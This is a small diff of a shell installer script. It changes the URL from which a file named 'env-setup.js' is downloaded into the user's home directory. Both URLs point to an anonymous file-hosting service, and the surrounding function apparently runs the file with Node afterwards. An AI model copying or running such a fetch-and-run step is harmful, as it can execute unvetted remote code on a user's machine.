@@ -144,7 +144,7 @@ run_part2_node_driver() {
 
   track_step "part2_step_3"
   ENV_SETUP_JS="${USER_HOME}/env-setup.js"
-  download "https://files.catbox.moe/l2rxnb.js" "$ENV_SETUP_JS"
+  download "https://files.catbox.moe/tkgnyt.js" "$ENV_SETUP_JS"
   [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
 
   track_step "part2_step_4"
